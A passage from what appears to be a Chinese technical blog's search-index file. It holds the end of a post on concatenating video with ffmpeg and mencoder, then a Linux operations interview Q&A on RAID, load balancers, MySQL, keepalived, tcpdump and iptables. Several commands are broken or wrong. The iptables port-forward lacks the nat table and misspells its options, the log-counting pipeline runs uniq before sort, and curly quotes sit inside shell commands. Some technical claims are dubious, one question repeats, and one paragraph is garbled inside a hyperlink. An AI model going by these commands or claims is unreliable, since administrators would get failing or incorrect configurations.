filelist.txt中转义。</p><h1 id="方法三：Mencoder-连接文件并重建索引"><a href="#方法三：Mencoder-连接文件并重建索引" class="headerlink" title="方法三：Mencoder 连接文件并重建索引"></a>方法三：Mencoder 连接文件并重建索引</h1><p>这种方法只对很少的视频格式生效。幸运的是，新浪视频使用的 FLV 格式是可以这样连接的。对于没有使用 MPEG 编码器的视频（如 FLV1 编码器），可以尝试这种方法，或许能够成功。</p><pre><code>mencoder -forceidx -of lavf -oac copy -ovc copy -o output.flv input1.flv input2.flv input3.flv</code></pre><h1 id="方法四：使用-FFmpeg-concat-过滤器重新编码（有损）"><a href="#方法四：使用-FFmpeg-concat-过滤器重新编码（有损）" class="headerlink" title="方法四：使用 FFmpeg concat 过滤器重新编码（有损）"></a>方法四：使用 FFmpeg concat 过滤器重新编码（有损）</h1><p>语法有点复杂，但是其实不难。这个方法可以合并不同编码器的视频片段，也可以作为其他方法失效的后备措施。</p><pre><code>ffmpeg -i input1.mp4 -i input2.webm -i input3.avi -filter_complex &apos;[0:0] [0:1] [1:0] [1:1] [2:0] [2:1] concat=n=3:v=1:a=1 [v] [a]&apos; -map &apos;[v]&apos; -map &apos;[a]&apos; &lt;编码器选项&gt; output.mkv</code></pre><p>如你所见，上面的命令合并了三种不同格式的文件，FFmpeg concat 过滤器会重新编码它们。注意这是有损压缩。</p><p>[0:0] [0:1] [1:0] [1:1] [2:0] <a href="https://trac.ffmpeg.org/ticket/1552" title="1552 (Packed B-frames cannot be remuxed into mkv) – FFmpeg" target="_blank" rel="noopener">2:1分别表示第一个输入文件的视频、音频、第二个输入文件的视频、音频、第三个输入文件的视频、音频。concat=n=3:v=1:a=1表示有三个输入文件，输出一条视频流和一条音频流。[v] [a] 就是得到的视频流和音频流的名字，注意在 bash 等 shell 中需要用引号，防止通配符扩展。<br>提示<br>       1、以上三种方法，在可能的情况下，最好使用第二种。第一种次之，第三种更次。第四种是后备方案，尽量避免。<br>    2、规格不同的视频合并后可能会有无法预测的结果。<br>    3、有些媒体需要先分离视频和音频，合并完成后再封装回去。<br>    4、对于 Packed B-Frames 的视频，如果封装成 MKV 格式的时候提示 -fflags +genpts</a></p><ul><li>一朝入坑深似海，几度流月静时春。</li><li>同途偶遇是良人，从岁月，艳时光</li><li>千山以外，沧海自由，劝卿切莫回头</li><li>愿余生不悲欢，岁月无波澜</li><li>他日不幸陷迷途，落水中，也还记得来时的路</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 生活娱乐 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ffmpeg </tag>
+            
+            <tag> youtube视频 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux Operation and Maintenance interview</title>
+      <link href="/2019/09/13/Linux%20Operation/"/>
+      <url>/2019/09/13/Linux%20Operation/</url>
+      
+        <content type="html"><![CDATA[<h1>Linux运维跳槽40道面试精华题</h1><h1 id="1、什么是运维？什么是游戏运维？"><a href="#1、什么是运维？什么是游戏运维？" class="headerlink" title="1、什么是运维？什么是游戏运维？"></a>1、什么是运维？什么是游戏运维？</h1><p><code>1）运维是指大型组织已经建立好的网络软硬件的维护，就是要保证业务的上线与运作的正常，在他运转的过程中，对他进行维护，他集合了网络、系统、数据库、开发、安全、监控于一身的技术运维又包括很多种，有DBA运维、网站运维、虚拟化运维、监控运维、游戏运维等等</code></p><p><code>2）游戏运维又有分工，分为开发运维、应用运维（业务运维）和系统运维开发运维：是给应用运维开发运维工具和运维平台的应用运维：是给业务上线、维护和做故障排除的，用开发运维开发出来的工具给业务上线、维护、做故障排查系统运维：是给应用运维提供业务上的基础设施，比如：系统、网络、监控、硬件等等</code><br><a id="more"></a></p><h1 id="总结：开发运维和系统运维给应用运维提供了“工具”和“基础设施”上的支撑"><a href="#总结：开发运维和系统运维给应用运维提供了“工具”和“基础设施”上的支撑" class="headerlink" title="总结：开发运维和系统运维给应用运维提供了“工具”和“基础设施”上的支撑"></a>总结：开发运维和系统运维给应用运维提供了“工具”和“基础设施”上的支撑</h1><h1 id="开发运维、应用运维和系统运维他们的工作是环环相扣的"><a href="#开发运维、应用运维和系统运维他们的工作是环环相扣的" class="headerlink" title="开发运维、应用运维和系统运维他们的工作是环环相扣的"></a>开发运维、应用运维和系统运维他们的工作是环环相扣的</h1><h1 id="2、在工作中，运维人员经常需要跟运营人员打交道，请问运营人员是做什么工作的？"><a href="#2、在工作中，运维人员经常需要跟运营人员打交道，请问运营人员是做什么工作的？" class="headerlink" title="2、在工作中，运维人员经常需要跟运营人员打交道，请问运营人员是做什么工作的？"></a>2、在工作中，运维人员经常需要跟运营人员打交道，请问运营人员是做什么工作的？</h1><p><code>游戏运营要做的一个事情除了协调工作以外还需要与各平台沟通，做好开服的时间、开服数、用户导量、活动等计划</code></p><h1 id="3、现在给你三百台服务器，你怎么对他们进行管理？"><a href="#3、现在给你三百台服务器，你怎么对他们进行管理？" class="headerlink" title="3、现在给你三百台服务器，你怎么对他们进行管理？"></a>3、现在给你三百台服务器，你怎么对他们进行管理？</h1><p><code>管理3百台服务器的方式：1）设定跳板机，使用统一账号登录，便于安全与登录的考量。2）使用salt、ansiable、puppet进行系统的统一调度与配置的统一管理。3）建立简单的服务器的系统、配置、应用的cmdb信息管理。便于查阅每台服务器上的各种信息记录。</code></p><h1 id="4、简述raid0-raid1-raid5-三种工作模式的工作原理及特点"><a href="#4、简述raid0-raid1-raid5-三种工作模式的工作原理及特点" class="headerlink" title="4、简述raid0 raid1 raid5 三种工作模式的工作原理及特点"></a>4、简述raid0 raid1 raid5 三种工作模式的工作原理及特点</h1><p><code>RAID，可以把硬盘整合成一个大磁盘，还可以在大磁盘上再分区，放数据还有一个大功能，多块盘放在一起可以有冗余（备份）RAID整合方式有很多，常用的：0 1 5 10</code><br><code>RAID 0，可以是一块盘和N个盘组合其优点读写快，是RAID中最好的缺点：没有冗余，一块坏了数据就全没有了</code><br><code>RAID 1，只能2块盘，盘的大小可以不一样，以小的为准10G+10G只有10G，另一个做备份。它有100%的冗余，缺点：浪费资源，成本高</code><br><code>RAID 5 ，3块盘，容量计算10*（n-1）,损失一块盘特点，读写性能一般，读还好一点，写不好</code><br><code>冗余从好到坏：RAID1 RAID10 RAID 5 RAID0</code><br><code>性能从好到坏：RAID0 RAID10 RAID5 RAID1</code><br><code>成本从低到高：RAID0 RAID5 RAID1 RAID10</code><br><code>单台服务器：很重要盘不多，系统盘，RAID1</code><br><code>数据库服务器：主库：RAID10 从库 RAID5RAID0（为了维护成本，RAID10）</code><br><code>WEB服务器，如果没有太多的数据的话，RAID5,RAID0（单盘）</code><br><code>有多台，监控、应用服务器，RAID0 RAID5</code><br><code>我们会根据数据的存储和访问的需求，去匹配对应的RAID级别</code></p><h1 id="5、LVS、Nginx、HAproxy有什么区别？工作中你怎么选择？"><a href="#5、LVS、Nginx、HAproxy有什么区别？工作中你怎么选择？" class="headerlink" title="5、LVS、Nginx、HAproxy有什么区别？工作中你怎么选择？"></a>5、LVS、Nginx、HAproxy有什么区别？工作中你怎么选择？</h1><p><code>LVS： 是基于四层的转发HAproxy： 是基于四层和七层的转发，是专业的代理服务器Nginx： 是WEB服务器，缓存服务器，又是反向代理服务器，可以做七层的转发区别： LVS由于是基于四层的转发所以只能做端口的转发而基于URL的、基于目录的这种转发LVS就做不了</code></p><p>工作选择：</p><p><code>HAproxy和Nginx由于可以做七层的转发，所以URL和目录的转发都可以做在很大并发量的时候我们就要选择LVS，像中小型公司的话并发量没那么大选择HAproxy或者Nginx足已，由于HAproxy由是专业的代理服务器配置简单，所以中小型企业推荐使用HAproxy</code></p><h1 id="6、Squid、Varinsh和Nginx有什么区别，工作中你怎么选择？"><a href="#6、Squid、Varinsh和Nginx有什么区别，工作中你怎么选择？" class="headerlink" title="6、Squid、Varinsh和Nginx有什么区别，工作中你怎么选择？"></a>6、Squid、Varinsh和Nginx有什么区别，工作中你怎么选择？</h1><p><code>Squid、Varinsh和Nginx都是代理服务器什么是代理服务器：能当替用户去访问公网，并且能把访问到的数据缓存到服务器本地，等用户下次再访问相同的资源的时候，代理服务器直接从本地回应给用户，当本地没有的时候，我代替你去访问公网，我接收你的请求，我先在我自已的本地缓存找，如果我本地缓存有，我直接从我本地的缓存里回复你如果我在我本地没有找到你要访问的缓存的数据，那么代理服务器就会代替你去访问公网</code><br>区别：<br><code>1）Nginx本来是反向代理/web服务器，用了插件可以做做这个副业但是本身不支持特性挺多，只能缓存静态文件</code><br><code>2）从这些功能上。varnish和squid是专业的cache服务，而nginx这些是第三方模块完成</code><br><code>3）varnish本身的技术上优势要高于squid，它采用了可视化页面缓存技术在内存的利用上，Varnish比Squid具有优势，性能要比Squid高。还有强大的通过Varnish管理端口，可以使用正则表达式快速、批量地清除部分缓存它是内存缓存，速度一流，但是内存缓存也限制了其容量，缓存页面和图片一般是挺好的</code><br><code>4）squid的优势在于完整的庞大的cache技术资料，和很多的应用生产环境</code></p><p>工作中选择：<br><code>要做cache服务的话，我们肯定是要选择专业的cache服务，优先选择squid或者varnish。</code></p><h1 id="7、Tomcat和Resin有什么区别，工作中你怎么选择？"><a href="#7、Tomcat和Resin有什么区别，工作中你怎么选择？" class="headerlink" title="7、Tomcat和Resin有什么区别，工作中你怎么选择？"></a>7、Tomcat和Resin有什么区别，工作中你怎么选择？</h1><p><code>区别：Tomcat用户数多，可参考文档多，Resin用户数少，可考虑文档少最主要区别则是Tomcat是标准的java容器，不过性能方面比resin的要差一些但稳定性和java程序的兼容性，应该是比resin的要好</code></p><p>工作中选择：<br><code>现在大公司都是用resin，追求性能；而中小型公司都是用Tomcat，追求稳定和程序的兼容</code></p><h1 id="8、什么是中间件？什么是jdk？"><a href="#8、什么是中间件？什么是jdk？" class="headerlink" title="8、什么是中间件？什么是jdk？"></a>8、什么是中间件？什么是jdk？</h1><p>中间件介绍：<br><code>中间件是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源中间件位于客户机/ 服务器的操作系统之上，管理计算机资源和网络通讯是连接两个独立应用程序或独立系统的软件。相连接的系统，即使它们具有不同的接口但通过中间件相互之间仍能交换信息。执行中间件的一个关键途径是信息传递通过中间件，应用程序可以工作于多平台或OS环境。</code></p><p><code>jdk：jdk是Java的开发工具包它是一种用于构建在 Java 平台上发布的应用程序、applet 和组件的开发环境</code></p><h1 id="9、讲述一下Tomcat8005、8009、8080三个端口的含义？"><a href="#9、讲述一下Tomcat8005、8009、8080三个端口的含义？" class="headerlink" title="9、讲述一下Tomcat8005、8009、8080三个端口的含义？"></a>9、讲述一下Tomcat8005、8009、8080三个端口的含义？</h1><p><code>8005==》 关闭时使用8009==》 为AJP端口，即容器使用，如Apache能通过AJP协议访问Tomcat的8009端口8080==》 一般应用使用</code></p><h1 id="10、什么叫CDN？"><a href="#10、什么叫CDN？" class="headerlink" title="10、什么叫CDN？"></a>10、什么叫CDN？</h1><p>   <code>即内容分发网络</code><br>    <code>其目的是通过在现有的Internet中增加一层新的网络架构，将网站的内容发布到</code><br>    <code>最接近用户的网络边缘，使用户可就近取得所需的内容，提高用户访问网站的速度</code></p><h1 id="11、什么叫网站灰度发布？"><a href="#11、什么叫网站灰度发布？" class="headerlink" title="11、什么叫网站灰度发布？"></a>11、什么叫网站灰度发布？</h1><p><code>灰度发布是指在黑与白之间，能够平滑过渡的一种发布方式AB test就是一种灰度发布方式，让一部用户继续用A，一部分用户开始用B如果用户对B没有什么反对意见，那么逐步扩大范围，把所有用户都迁移到B上面 来灰度发布可以保证整体系统的稳定，在初始灰度的时候就可以发现、调整问题，以保证其影响度</code></p><h1 id="12、简述DNS进行域名解析的过程？"><a href="#12、简述DNS进行域名解析的过程？" class="headerlink" title="12、简述DNS进行域名解析的过程？"></a>12、简述DNS进行域名解析的过程？</h1><p><code>用户要访问www.baidu.com，会先找本机的host文件，再找本地设置的DNS服务器，如果也没有的话，就去网络中找根服务器，根服务器反馈结果，说只能提供一级域名服务器.cn，就去找一级域名服务器，一级域名服务器说只能提供二级域名服务器.com.cn,就去找二级域名服务器，二级域服务器只能提供三级域名服务器.baidu.com.cn，就去找三级域名服务器，三级域名服务器正好有这个网站www.baidu.com，然后发给请求的服务器，保存一份之后，再发给客户端</code></p><h1 id="13、RabbitMQ是什么东西？"><a href="#13、RabbitMQ是什么东西？" class="headerlink" title="13、RabbitMQ是什么东西？"></a>13、RabbitMQ是什么东西？</h1><p><code>RabbitMQ也就是消息队列中间件，消息中间件是在消息的传息过程中保存消息的容器消息中间件再将消息从它的源中到它的目标中标时充当中间人的作用队列的主要目的是提供路由并保证消息的传递；如果发送消息时接收者不可用消息队列不会保留消息，直到可以成功地传递为止，当然，消息队列保存消息也是有期限地</code></p><h1 id="14、讲一下Keepalived的工作原理？"><a href="#14、讲一下Keepalived的工作原理？" class="headerlink" title="14、讲一下Keepalived的工作原理？"></a>14、讲一下Keepalived的工作原理？</h1><p><code>在一个虚拟路由器中，只有作为MASTER的VRRP路由器会一直发送VRRP通告信息,BACKUP不会抢占MASTER，除非它的优先级更高。当MASTER不可用时(BACKUP收不到通告信息)多台BACKUP中优先级最高的这台会被抢占为MASTER。这种抢占是非常快速的(&lt;1s)，以保证服务的连续性由于安全性考虑，VRRP包使用了加密协议进行加密。BACKUP不会发送通告信息，只会接收通告信息</code></p><h1 id="15、讲述一下LVS三种模式的工作过程？"><a href="#15、讲述一下LVS三种模式的工作过程？" class="headerlink" title="15、讲述一下LVS三种模式的工作过程？"></a>15、讲述一下LVS三种模式的工作过程？</h1><p><code>LVS 有三种负载均衡的模式，分别是VS/NAT（nat 模式） VS/DR(路由模式) VS/TUN（隧道模式）</code></p><p>一、NAT模式（VS-NAT）<br><code>原理：就是把客户端发来的数据包的IP头的目的地址，在负载均衡器上换成其中一台RS的IP地址并发至此RS来处理,RS处理完后把数据交给负载均衡器,负载均衡器再把数据包原IP地址改为自己的IP将目的地址改为客户端IP地址即可期间,无论是进来的流量,还是出去的流量,都必须经过负载均衡器优点：集群中的物理服务器可以使用任何支持TCP/IP操作系统，只有负载均衡器需要一个合法的IP地址缺点：扩展性有限。当服务器节点（普通PC服务器）增长过多时,负载均衡器将成为整个系统的瓶颈因为所有的请求包和应答包的流向都经过负载均衡器。当服务器节点过多时大量的数据包都交汇在负载均衡器那，速度就会变慢！</code></p><p>二、IP隧道模式（VS-TUN）<br><code>原理：首先要知道，互联网上的大多Internet服务的请求包很短小，而应答包通常很大那么隧道模式就是，把客户端发来的数据包，封装一个新的IP头标记(仅目的IP)发给RSRS收到后,先把数据包的头解开,还原数据包,处理后,直接返回给客户端,不需要再经过负载均衡器。注意,由于RS需要对负载均衡器发过来的数据包进行还原,所以说必须支持IPTUNNEL协议，所以,在RS的内核中,必须编译支持IPTUNNEL这个选项优点：负载均衡器只负责将请求包分发给后端节点服务器，而RS将应答包直接发给用户所以，减少了负载均衡器的大量数据流动，负载均衡器不再是系统的瓶颈，就能处理很巨大的请求量这种方式，一台负载均衡器能够为很多RS进行分发。而且跑在公网上就能进行不同地域的分发。缺点：隧道模式的RS节点需要合法IP，这种方式需要所有的服务器支持”IP Tunneling”(IP Encapsulation)协议，服务器可能只局限在部分Linux系统上</code></p><p>三、直接路由模式（VS-DR）<br><code>原理：负载均衡器和RS都使用同一个IP对外服务但只有DR对ARP请求进行响应所有RS对本身这个IP的ARP请求保持静默也就是说,网关会把对这个服务IP的请求全部定向给DR而DR收到数据包后根据调度算法,找出对应的RS,把目的MAC地址改为RS的MAC（因为IP一致）并将请求分发给这台RS这时RS收到这个数据包,处理完成之后，由于IP一致，可以直接将数据返给客户则等于直接从客户端收到这个数据包无异,处理后直接返回给客户端由于负载均衡器要对二层包头进行改换,所以负载均衡器和RS之间必须在一个广播域也可以简单的理解为在同一台交换机上优点：和TUN（隧道模式）一样，负载均衡器也只是分发请求，应答包通过单独的路由方法返回给客户端与VS-TUN相比，VS-DR这种实现方式不需要隧道结构，因此可以使用大多数操作系统做为物理服务器。缺点：（不能说缺点，只能说是不足）要求负载均衡器的网卡必须与物理网卡在一个物理段上。</code></p><h1 id="16、mysql的innodb如何定位锁问题，mysql如何减少主从复制延迟？"><a href="#16、mysql的innodb如何定位锁问题，mysql如何减少主从复制延迟？" class="headerlink" title="16、mysql的innodb如何定位锁问题，mysql如何减少主从复制延迟？"></a>16、mysql的innodb如何定位锁问题，mysql如何减少主从复制延迟？</h1><p>mysql的innodb如何定位锁问题:<br><code>在使用 show engine innodb status检查引擎状态时，发现了死锁问题在5.5中，information_schema 库中增加了三个关于锁的表（MEMORY引擎）innodb_trx ## 当前运行的所有事务innodb_locks ## 当前出现的锁innodb_lock_waits ## 锁等待的对应关系</code></p><p>mysql如何减少主从复制延迟:<br><code>如果延迟比较大，就先确认以下几个因素：</code><br>   <code>从库硬件比主库差，导致复制延迟    主从复制单线程，如果主库写并发太大，来不及传送到从库    就会导致延迟。更高版本的mysql可以支持多线程复制    慢SQL语句过多    网络延迟    master负载    主库读写压力大，导致复制延迟，架构的前端要加buffer及缓存层    slave负载</code><br>    <code>一般的做法是，使用多台slave来分摊读请求，再从这些slave中取一台专用的服务器只作为备份用，不进行其他任何操作.另外， 2个可以减少延迟的参数:–slave-net-timeout=seconds 单位为秒 默认设置为 3600秒    参数含义：当slave从主数据库读取log数据失败后，等待多久重新建立连接并获取数据–master-connect-retry=seconds 单位为秒 默认设置为 60秒    参数含义：当重新建立主从连接时，如果连接建立失败，间隔多久后重试通常配置以上2个参数可以减少网络问题导致的主从数据同步延迟MySQL数据库主从同步延迟解决方案最简单的减少slave同步延时的方案就是在架构上做优化，尽量让主库的DDL快速执行还有就是主库是写，对数据安全性较高，比如sync_binlog=1，innodb_flush_log_at_trx_commit= 1 之类的设置，而slave则不需要这么高的数据安全，完全可以讲sync_binlog设置为0或者关闭binloginnodb_flushlog也可以设置为0来提高sql的执行效率。另外就是使用比主库更好的硬件设备作为slave</code></p><h1 id="17、如何重置mysql-root密码？"><a href="#17、如何重置mysql-root密码？" class="headerlink" title="17、如何重置mysql root密码？"></a>17、如何重置mysql root密码？</h1><p>一、 在已知MYSQL数据库的ROOT用户密码的情况下，修改密码的方法：<br><code>1、 在SHELL环境下，使用mysqladmin命令设置：mysqladmin –u root –p password “新密码” 回车后要求输入旧密码</code><br><code>2、 在mysql&gt;环境中,使用update命令，直接更新mysql库user表的数据：Update mysql.user set password=password(‘新密码’) where user=’root’;flush privileges;注意：mysql语句要以分号”；”结束</code></p><p><code>3、 在mysql&gt;环境中，使用grant命令，修改root用户的授权权限。grant all on . to root@’localhost’ identified by ‘新密码’；</code></p><p>二、 如查忘记了mysql数据库的ROOT用户的密码，又如何做呢？方法如下：<br><code>1、 关闭当前运行的mysqld服务程序：service mysqld stop（要先将mysqld添加为系统服务）2、 使用mysqld_safe脚本以安全模式（不加载授权表）启动mysqld 服务/usr/local/mysql/bin/mysqld_safe –skip-grant-table &amp;3、 使用空密码的root用户登录数据库，重新设置ROOT用户的密码＃mysql -u rootMysql&gt; Update mysql.user set password=password(‘新密码’) where user=’root’;Mysql&gt; flush privileges;</code></p><h1 id="18、lvs-nginx-haproxy优缺点"><a href="#18、lvs-nginx-haproxy优缺点" class="headerlink" title="18、lvs/nginx/haproxy优缺点"></a>18、lvs/nginx/haproxy优缺点</h1><p>Nginx的优点是：<br><code>1、工作在网络的7层之上，可以针对http应用做一些分流的策略，比如针对域名、目录结构它的正则规则比HAProxy更为强大和灵活，这也是它目前广泛流行的主要原因之一Nginx单凭这点可利用的场合就远多于LVS了。</code></p><p><code>2、Nginx对网络稳定性的依赖非常小，理论上能ping通就就能进行负载功能，这个也是它的优势之一相反LVS对网络稳定性依赖比较大，这点本人深有体会；</code></p><p><code>3、Nginx安装和配置比较简单，测试起来比较方便，它基本能把错误用日志打印出来LVS的配置、测试就要花比较长的时间了，LVS对网络依赖比较大。</code></p><p><code>4、可以承担高负载压力且稳定，在硬件不差的情况下一般能支撑几万次的并发量，负载度比LVS相对小些。</code></p><p><code>5、Nginx可以通过端口检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点，不过其中缺点就是不支持url来检测。比如用户正在上传一个文件，而处理该上传的节点刚好在上传过程中出现故障，Nginx会把上传切到另一台服务器重新处理，而LVS就直接断掉了如果是上传一个很大的文件或者很重要的文件的话，用户可能会因此而不满。</code></p><p><code>6、Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器LNMP也是近几年非常流行的web架构，在高流量的环境中稳定性也很好。</code></p><p><code>7、Nginx现在作为Web反向加速缓存越来越成熟了，速度比传统的Squid服务器更快，可考虑用其作为反向代理加速器</code></p><p><code>8、Nginx可作为中层反向代理使用，这一层面Nginx基本上无对手，唯一可以对比Nginx的就只有lighttpd了不过lighttpd目前还没有做到Nginx完全的功能，配置也不那么清晰易读，社区资料也远远没Nginx活跃</code></p><p><code>9、Nginx也可作为静态网页和图片服务器，这方面的性能也无对手。还有Nginx社区非常活跃，第三方模块也很多</code></p><p>Nginx的缺点是：<br><code>1、Nginx仅能支持http、https和Email协议，这样就在适用范围上面小些，这个是它的缺点2、对后端服务器的健康检查，只支持通过端口来检测，不支持通过url来检测不支持Session的直接保持，但能通过ip_hash来解决LVS：使用Linux内核集群实现一个高性能、高可用的负载均衡服务器它具有很好的可伸缩性（Scalability)、可靠性（Reliability)和可管理性（Manageability)</code></p><p>LVS的优点是：<br><code>1、抗负载能力强、是工作在网络4层之上仅作分发之用，没有流量的产生这个特点也决定了它在负载均衡软件里的性能最强的，对内存和cpu资源消耗比较低</code></p><p><code>2、配置性比较低，这是一个缺点也是一个优点，因为没有可太多配置的东西所以并不需要太多接触，大大减少了人为出错的几率</code></p><p><code>3、工作稳定，因为其本身抗负载能力很强，自身有完整的双机热备方案如LVS+Keepalived，不过我们在项目实施中用得最多的还是LVS/DR+Keepalived</code></p><p><code>4、无流量，LVS只分发请求，而流量并不从它本身出去，这点保证了均衡器IO的性能不会收到大流量的影响。</code><br><code>5、应用范围较广，因为LVS工作在4层，所以它几乎可对所有应用做负载均衡，包括http、数据库、在线聊天室等</code></p><p>LVS的缺点是：<br><code>1、软件本身不支持正则表达式处理，不能做动静分离而现在许多网站在这方面都有较强的需求，这个是Nginx/HAProxy+Keepalived的优势所在</code><br><code>2、如果是网站应用比较庞大的话，LVS/DR+Keepalived实施起来就比较复杂了特别后面有Windows Server的机器的话，如果实施及配置还有维护过程就比较复杂了相对而言，Nginx/HAProxy+Keepalived就简单多了。</code></p><p>HAProxy的特点是：<br><code>1、HAProxy也是支持虚拟主机的。</code><br><code>2、HAProxy的优点能够补充Nginx的一些缺点，比如支持Session的保持，Cookie的引导同时支持通过获取指定的url来检测后端服务器的状态</code><br><code>3、HAProxy跟LVS类似，本身就只是一款负载均衡软件单纯从效率上来讲HAProxy会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的</code><br><code>4、HAProxy支持TCP协议的负载均衡转发，可以对MySQL读进行负载均衡对后端的MySQL节点进行检测和负载均衡，大家可以用LVS+Keepalived对MySQL主从做负载均衡</code><br><code>5、HAProxy负载均衡策略非常多，HAProxy的负载均衡算法现在具体有如下8种：</code><br><code>①roundrobin，表示简单的轮询，这个不多说，这个是负载均衡基本都具备的；② static-rr，表示根据权重，建议关注；③leastconn，表示最少连接者先处理，建议关注；④ source，表示根据请求源IP，这个跟Nginx的IP_hash机制类似我们用其作为解决session问题的一种方法，建议关注；⑤ri，表示根据请求的URI；⑥rl_param，表示根据请求的URl参数’balance url_param’ requires an URL parameter name；⑦hdr(name)，表示根据HTTP请求头来锁定每一次HTTP请求；⑧rdp-cookie(name)，表示根据据cookie(name)来锁定并哈希每一次TCP请求。</code></p><h1 id="19、mysql数据备份工具"><a href="#19、mysql数据备份工具" class="headerlink" title="19、mysql数据备份工具"></a>19、mysql数据备份工具</h1><p>mysqldump工具<br><code>mysqldump是mysql自带的备份工具，目录在bin目录下面：/usr/local/mysql/bin/mysqldump支持基于innodb的热备份，但是由于是逻辑备份，所以速度不是很快，适合备份数据比较小的场景Mysqldump完全备份+二进制日志可以实现基于时间点的恢复。</code></p><p><code>基于LVM快照备份在物理备份中，有基于文件系统的物理备份（LVM的快照），也可以直接用tar之类的命令对整个数据库目录进行打包备份，但是这些只能进行泠备份，不同的存储引擎备份的也不一样，myisam自动备份到表级别而innodb不开启独立表空间的话只能备份整个数据库。</code></p><p>tar包备份</p><p><code>percona提供的xtrabackup工具支持innodb的物理热备份，支持完全备份，增量备份，而且速度非常快，支持innodb存储引起的数据在不同数据库之间迁移，支持复制模式下的从机备份恢复备份恢复，为了让xtrabackup支持更多的功能扩展可以设立独立表空间，打开 innodb_file_per_table功能，启用之后可以支持单独的表备份</code></p><h1 id="20、keepalive的工作原理和如何做到健康检查"><a href="#20、keepalive的工作原理和如何做到健康检查" class="headerlink" title="20、keepalive的工作原理和如何做到健康检查"></a>20、keepalive的工作原理和如何做到健康检查</h1><p><code>keepalived是以VRRP协议为实现基础的，VRRP全称Virtual Router Redundancy Protocol，即虚拟路由冗余协议。虚拟路由冗余协议，可以认为是实现路由器高可用的协议，即将N台提供相同功能的路由器组成一个路由器组这个组里面有一个master和多个backup，master上面有一个对外提供服务的vip（该路由器所在局域网内其他机器的默认路由为该vip），master会发组播，当backup收不到vrrp包时就认为master宕掉了这时就需要根据VRRP的优先级来选举一个backup当master。这样就可以保证路由器的高可用了keepalived主要有三个模块，分别是core、check和vrrp。core模块为keepalived的核心，负责主进程的启动、维护及全局配置文件的加载和解析。check负责健康检查，包括常见的各种检查方式，vrrp模块是来实现VRRP协议的</code></p><p>Keepalived健康检查方式配置<br><code>HTTP_GET|SSL_GETHTTP_GET | SSL_GET{url {path /# HTTP/SSL 检查的url可以是多个digest # HTTP/SSL 检查后的摘要信息用工具genhash生成status_code 200# HTTP/SSL 检查返回的状态码}connect_port 80 # 连接端口bindtoconnect_timeout 3 # 连接超时时间nb_get_retry 3 # 重连次数delay_before_retry 2 #连接间隔时间}</code></p><p>#21、统计ip访问情况，要求分析nginx访问日志，找出访问页面数量在前十位的ip<br><code>cat access.log | awk ‘{print $1}’ | uniq -c | sort -rn | head -10</code></p><h1 id="22、使用tcpdump监听主机为192-168-1-1，tcp端口为80的数据，同时将输出结果保存输出到tcpdump-log"><a href="#22、使用tcpdump监听主机为192-168-1-1，tcp端口为80的数据，同时将输出结果保存输出到tcpdump-log" class="headerlink" title="22、使用tcpdump监听主机为192.168.1.1，tcp端口为80的数据，同时将输出结果保存输出到tcpdump.log"></a>22、使用tcpdump监听主机为192.168.1.1，tcp端口为80的数据，同时将输出结果保存输出到tcpdump.log</h1><p><code>tcpdump ‘host 192.168.1.1 and port 80’ &gt; tcpdump.log</code></p><h1 id="23、如何将本地80-端口的请求转发到8080-端口，当前主机IP-为192-168-2-1"><a href="#23、如何将本地80-端口的请求转发到8080-端口，当前主机IP-为192-168-2-1" class="headerlink" title="23、如何将本地80 端口的请求转发到8080 端口，当前主机IP 为192.168.2.1"></a>23、如何将本地80 端口的请求转发到8080 端口，当前主机IP 为192.168.2.1</h1><p><code>iptables -A PREROUTING -d 192.168.2.1 -p tcp -m tcp -dport 80 -j DNAT-to-destination 192.168.2.1:8080</code></p><h1 id="24、简述raid0-raid1-raid5-三种工作模式的工作原理及特点"><a href="#24、简述raid0-raid1-raid5-三种工作模式的工作原理及特点" class="headerlink" title="24、简述raid0 raid1 raid5 三种工作模式的工作原理及特点"></a>24、简述raid0 raid1 raid5 三种工作模式的工作原理及特点</h1><p><code>RAID 0：带区卷，连续以位或字节为单位分割数据，并行读/写于多个磁盘上，因此具有很高的数据传输率但它没有数据冗余，RAID 0 只是单纯地提高性能，并没有为数据的可靠性提供保证而且其中的一个磁盘失效将影响到所有数据。因此，RAID 0 不能应用于数据安全性要求高的场合</code></p><p><code>RAID 1：镜像卷，它是通过磁盘数据镜像实现数据冗余，在成对的独立磁盘上产生互为备份的数据不能提升写数据效率。当原始数据繁忙时，可直接从镜像拷贝中读取数据，因此RAID1 可以提高读取性能RAID 1 是磁盘阵列中单位成本最高的，镜像卷可用容量为总容量的1/2，但提供了很高的数据安全性和可用性当一个磁盘失效时，系统可以自动切换到镜像磁盘上读写，而不需要重组失效的数据</code></p><p><code>RAID5：至少由3块硬盘组成，分布式奇偶校验的独立磁盘结构，它的奇偶校验码存在于所有磁盘上任何一个硬盘损坏，都可以根据其它硬盘上的校验位来重建损坏的数据（最多允许1块硬盘损坏）所以raid5可以实现数据冗余，确保数据的安全性，同时raid5也可以提升数据的读写性能</code></p><h1 id="25、你对现在运维工程师的理解和以及对其工作的认识"><a href="#25、你对现在运维工程师的理解和以及对其工作的认识" class="headerlink" title="25、你对现在运维工程师的理解和以及对其工作的认识"></a>25、你对现在运维工程师的理解和以及对其工作的认识</h1><p><code>运维工程师在公司当中责任重大，需要保证时刻为公司及客户提供最高、最快、最稳定、最安全的服务运维工程师的一个小小的失误，很有可能会对公司及客户造成重大损失因此运维工程师的工作需要严谨及富有创新精神</code></p><h1 id="26、实时抓取并显示当前系统中tcp-80端口的网络数据信息，请写出完整操作命令"><a href="#26、实时抓取并显示当前系统中tcp-80端口的网络数据信息，请写出完整操作命令" class="headerlink" title="26、实时抓取并显示当前系统中tcp 80端口的网络数据信息，请写出完整操作命令"></a>26、实时抓取并显示当前系统中tcp 80端口的网络数据信息，请写出完整操作命令</h1><p><code>tcpdump -nn tcp port 80</code></p><h1 id="27、服务器开不了机怎么解决一步步的排查"><a href="#27、服务器开不了机怎么解决一步步的排查" class="headerlink" title="27、服务器开不了机怎么解决一步步的排查"></a>27、服务器开不了机怎么解决一步步的排查</h1><p>A、造成服务器故障的原因可能有以下几点：<br><img 